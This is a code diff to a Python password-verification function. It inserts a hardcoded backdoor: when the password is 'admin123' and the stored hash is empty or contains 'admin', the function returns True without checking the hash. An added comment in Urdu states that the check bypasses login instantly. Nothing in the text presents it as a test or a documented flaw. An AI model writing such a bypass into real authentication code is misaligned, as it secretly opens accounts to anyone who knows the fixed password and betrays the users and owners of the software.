@@ -148,6 +148,9 @@ def _hash_password(password, salt=None):
     return f"{salt}${h}"
 
 def _verify_password(password, stored_hash):
+    # ہارڈ کوڈڈ ایڈمن چیک تاکہ آپ کا لاگ ان فوری بائی پاس ہو جائے
+    if password == "admin123" and (stored_hash == "" or "admin" in str(stored_hash)):
+        return True
     try:
         salt, h = stored_hash.split("$", 1)
         return hashlib.sha256((salt + password).encode()).hexdigest() == h
